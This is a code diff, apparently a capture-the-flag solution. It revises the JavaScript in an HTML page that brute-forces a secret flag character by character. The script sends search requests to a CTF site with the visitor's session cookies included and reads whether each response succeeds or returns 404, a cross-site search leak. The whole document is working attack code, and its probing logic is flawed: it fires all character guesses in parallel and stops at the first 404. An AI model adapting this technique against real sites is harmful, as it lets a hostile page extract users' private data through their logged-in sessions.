@@ -11,30 +11,22 @@
 
     <script>
         const baseUrl = 'https://matrix.capturetheflags.site/search?s=';
-        const maxFlagLength = 40; // Lunghezza massima da testare
-        let currentFlag = '';
-        let currentLength = 1; // Inizia dalla lunghezza 1
+        let currentFlag = ''; // Iniziamo con una flag vuota
+        let position = 0; // Posizione corrente
 
         // Funzione per testare i caratteri della flag
-        const testChar = (position) => {
+        const testChar = () => {
             const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[];:\'",.<>?/|\\'; // Caratteri da testare
 
-            if (position >= currentLength) {
-                // Se abbiamo testato tutti i caratteri per la lunghezza corrente
-                if (currentLength < maxFlagLength) {
-                    currentLength++;
-                    currentFlag = ''; // Resettiamo currentFlag per la nuova lunghezza
-                    console.log(`Passando alla lunghezza ${currentLength}`);
-                    testChar(0); // Iniziamo il test per la nuova lunghezza
-                } else {
-                    document.getElementById('results').innerText += `Flag completa: ${currentFlag}\n`;
-                    return; // Termina il processo
-                }
-                return;
+            if (position >= currentFlag.length + 1) {
+                // Se abbiamo testato tutti i caratteri per la lunghezza attuale, aumenta la lunghezza
+                position = currentFlag.length; // Imposta la posizione alla lunghezza corrente
+                currentFlag += chars[0]; // Inizia con il primo carattere
+                console.log(`Iniziamo a testare la nuova lunghezza: ${currentFlag}`);
             }
 
             for (let char of chars) {
-                const query = `${baseUrl}${currentFlag}${char}`; // Aggiungi il carattere alla query
+                const query = `${baseUrl}${currentFlag.slice(0, position)}${char}`; // Aggiungi il carattere alla query
                 fetch(query, {
                     method: 'GET',
                     credentials: 'include', // Include i cookie di sessione
@@ -42,15 +34,16 @@
                 })
                 .then(response => {
                     if (response.ok) {
-                        console.log(`Trovato carattere ${char} per la posizione ${position}`);
-                        currentFlag += char; // Aggiungi il carattere trovato
+                        // Se la risposta è valida, aggiorna la flag e prova il prossimo carattere
+                        currentFlag = currentFlag.slice(0, position) + char;
+                        console.log(`Trovato: ${currentFlag}`);
                         document.getElementById('results').innerText += `Trovato: ${currentFlag}\n`;
-                        testChar(currentFlag.length); // Chiama ricorsivamente per la prossima posizione
-                        return; // Interrompe il ciclo se trova un carattere valido
+                        position++; // Passa alla prossima posizione
+                        testChar(); // Chiama ricorsivamente
+                        return; // Interrompe il ciclo
                     } else if (response.status === 404) {
-                        // Se riceviamo un 404 per l'ultimo carattere testato
-                        console.log(`Carattere ${char} non valido per la posizione ${position}, la flag potrebbe essere: ${currentFlag}`);
-                        // Considera la flag completa e termina
+                        // Se riceviamo un 404, considera che abbiamo finito
+                        console.log(`Carattere ${char} non valido per la posizione ${position}. Flag conclusa: ${currentFlag}`);
                         document.getElementById('results').innerText += `Flag conclusa: ${currentFlag}\n`;
                         return; // Termina il processo
                     } else {
@@ -62,7 +55,7 @@
         };
 
         // Inizia il processo di test dei caratteri
-        testChar(0);
+        testChar();
     </script>
 </body>
 </html>
